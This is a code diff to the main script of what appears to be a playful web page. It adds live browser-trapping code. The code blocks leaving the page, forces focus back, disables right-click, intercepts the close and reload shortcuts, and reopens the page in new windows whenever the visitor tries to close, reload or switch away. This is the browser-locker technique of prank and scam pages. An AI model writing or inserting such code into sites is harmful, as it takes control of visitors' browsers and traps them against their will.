@@ -11,6 +11,38 @@ import { emojiUrl } from "./url.js";
 import { init } from "./welcome.js";
 import { bounce, openWindow } from "./danceWindow.js";
 window.onload = init;
+// Prevent closing/reloading
+window.onbeforeunload = (e) => {
+  e.preventDefault();
+  e.returnValue = "Are you sure you want to leave?";
+  setTimeout(() => {
+    window.open(window.location.href, "_blank");
+  }, 100);
+  return "Are you sure you want to leave?";
+};
+
+// Try to regain focus
+window.onblur = () => {
+  window.focus();
+  setTimeout(() => {
+    window.focus();
+    window.open(window.location.href, "_blank");
+  }, 100);
+};
+
+// Prevent right-click and some key shortcuts
+window.addEventListener("contextmenu", (e) => e.preventDefault());
+window.addEventListener("keydown", (e) => {
+  // Block Ctrl+W, Ctrl+R, F5, Alt+F4, etc.
+  if (
+    (e.ctrlKey && (e.key === "w" || e.key === "r")) ||
+    e.key === "F5" ||
+    (e.altKey && e.key === "F4")
+  ) {
+    e.preventDefault();
+    window.open(window.location.href, "_blank");
+  }
+});
 
 function start() {
   try {
